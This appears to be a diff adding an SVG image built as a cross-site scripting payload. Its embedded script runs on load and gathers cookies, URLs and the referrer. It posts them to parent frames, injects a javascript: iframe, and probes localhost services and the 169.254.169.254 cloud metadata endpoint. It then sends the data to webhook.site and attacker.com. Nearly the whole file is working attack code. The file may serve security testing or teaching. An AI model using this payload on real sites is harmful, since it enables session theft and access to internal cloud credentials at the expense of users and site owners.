@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
+  <!-- SVG designed for iframe embedding with XSS -->
+  
+  <script><![CDATA[
+    // Check if we're in an iframe
+    const inIframe = window !== window.parent;
+    
+    function executePayload() {
+      console.log('SVG XSS payload executing...');
+      console.log('In iframe:', inIframe);
+      
+      // Collect sensitive information
+      const payload = {
+        url: window.location.href,
+        referrer: document.referrer,
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        inIframe: inIframe,
+        timestamp: new Date().toISOString()
+      };
+      
+      // If in iframe, try to access parent
+      if (inIframe) {
+        try {
+          payload.parentUrl = window.parent.location.href;
+          payload.parentTitle = window.parent.document.title;
+        } catch(e) {
+          payload.parentError = 'Cross-origin blocked';
+        }
+        
+        // Try to communicate with parent
+        try {
+          window.parent.postMessage({
+            type: 'svg-xss',
+            data: payload
+          }, '*');
+        } catch(e) {
+          console.log('PostMessage failed:', e);
+        }
+      }
+      
+      // Create iframe for further exploitation
+      const iframe = document.createElementNS('http://www.w3.org/1999/xhtml', 'iframe');
+      iframe.src = 'javascript:alert("Nested iframe XSS from SVG!")';
+      iframe.style.display = 'none';
+      document.documentElement.appendChild(iframe);
+      
+      // SSRF attempts
+      performSSRFFromSVG();
+      
+      // Exfiltrate data
+      exfiltrateFromSVG(payload);
+    }
+    
+    function performSSRFFromSVG() {
+      const targets = [
+        'http://127.0.0.1:5000/api/profile',
+        'http://127.0.0.1:9090/graphql',
+        'http://169.254.169.254/latest/meta-data/'
+      ];
+      
+      targets.forEach(target => {
+        const img = document.createElementNS('http://www.w3.org/2000/svg', 'image');
+        img.setAttributeNS('http://www.w3.org/1999/xlink', 'href', target);
+        img.setAttribute('width', '1');
+        img.setAttribute('height', '1');
+        img.setAttribute('onerror', `console.log('SSRF to ${target} detected')`);
+        document.documentElement.appendChild(img);
+      });
+    }
+    
+    function exfiltrateFromSVG(data) {
+      // Method 1: Image beacon
+      const img = new Image();
+      img.src = 'https://webhook.site/unique-id?svg-data=' + btoa(JSON.stringify(data));
+      
+      // Method 2: Fetch (if allowed)
+      try {
+        fetch('https://attacker.com/svg-collect', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify(data)
+        });
+      } catch(e) {
+        console.log('Fetch blocked:', e);
+      }
+    }
+    
+    // Execute immediately and on load
+    executePayload();
+    window.addEventListener('load', executePayload);
+    
+    // Listen for messages from parent/child frames
+    window.addEventListener('message', function(event) {
+      console.log('SVG received message:', event.data);
+      if (event.data.type === 'execute-svg-payload') {
+        executePayload();
+      }
+    });
+  ]]></script>
+  
+  <!-- Visible SVG content -->
+  <defs>
+    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%">
+      <stop offset="0%" style="stop-color:rgb(255,0,0);stop-opacity:1" />
+      <stop offset="100%" style="stop-color:rgb(255,255,0);stop-opacity:1" />
+    </linearGradient>
+  </defs>
+  
+  <rect width="300" height="200" fill="url(#grad1)" />
+  <text x="150" y="100" text-anchor="middle" fill="black" font-size="20" font-weight="bold">
+    Iframe XSS SVG
+  </text>
+  <text x="150" y="130" text-anchor="middle" fill="black" font-size="12">
+    Check console for payload execution
+  </text>
+</svg>
